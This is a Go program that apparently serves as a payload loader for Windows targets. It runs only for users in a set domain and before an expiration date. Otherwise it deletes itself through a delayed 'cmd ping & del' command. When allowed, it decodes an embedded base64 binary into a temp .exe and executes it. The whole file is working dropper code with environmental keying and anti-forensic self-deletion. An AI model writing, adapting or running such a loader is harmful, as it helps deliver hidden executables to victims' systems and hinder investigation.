package main

import (
	"encoding/base64"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"github.com/kardianos/osext"
)

var (
	// WindowsDomain defines the target Windows-Domain on which this app is allowed to run
	WindowsDomain string

	// ExpirationDate defines the date after that this app is no longer allowed to run
	ExpirationDate string
)

// Small helper function to check return values for errors
func checkErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// function to delete the executable file
//
// Must be performed if
// 		executable is called by a user not joined on the $WindowsDomain
// or
//		exe is called after the $ExpirationDate
func destroySelf() {
	// Get path of this executable
	exePath, err := osext.Executable()
	checkErr(err)
	// Spawn a new process that is able to delete this exe after the main process terminated
	// By pinging us self for 3 times we get the required time to terminate this app soon enough,
	// before the new process deletes the app's exe
	cmd := exec.Command("cmd", "/c", "ping", "localhost", "-n", "3", ">", "nul", "&", "del", exePath)
	err = cmd.Start()
	checkErr(err)
	// Hard exit to finish faster than the previously spawned process
	os.Exit(5)
}

// Returns true if WindowsDomain matches and
func isExecutionAllowed() bool {
	// Define MySQL-DateTime-Format as defined by Go
	layout := "2006-01-02T15:04:05"
	t, err := time.Parse(layout, ExpirationDate)
	checkErr(err)

	// Get the current user. The object also holds the full WINS-Domainname
	currentUser, err := user.Current()
	checkErr(err)

	// Check if the current user strings starts with the given WindowsDomain.
	isCurrentUserInDomain := strings.Index(currentUser.Username, WindowsDomain) == 0
	// Check if the ExpirationDate has been reached
	isExeNotExpired := t.After(time.Now())

	return isCurrentUserInDomain && isExeNotExpired
}

// Write the content of the Payload-Variable into a temporary file and execute it.
func executeBinary() {
	// Create the temporary file in the OS default temp dir
	fTemp, err := ioutil.TempFile("", "")
	checkErr(err)

	// decode the base64 content to a byte array
	dec, err := base64.StdEncoding.DecodeString(Payload)
	checkErr(err)

	// Write bytes to the file
	n, err := fTemp.Write(dec)
	if n == 0 {
		log.Fatal("Zero bytes written -> Payload may be empty or encoding was buggy...")
	}
	checkErr(err)

	// Close the file to be able to execute it as a new process
	fTemp.Close()

	// Mark file as executable by appending .exe to its name
	err = os.Rename(fTemp.Name(), fTemp.Name()+".exe")
	checkErr(err)

	// Execute the new file
	cmd := exec.Command(fTemp.Name() + ".exe")
	err = cmd.Start()
	checkErr(err)
}

func main() {

	if !isExecutionAllowed() {
		destroySelf()
	}

	executeBinary()
}
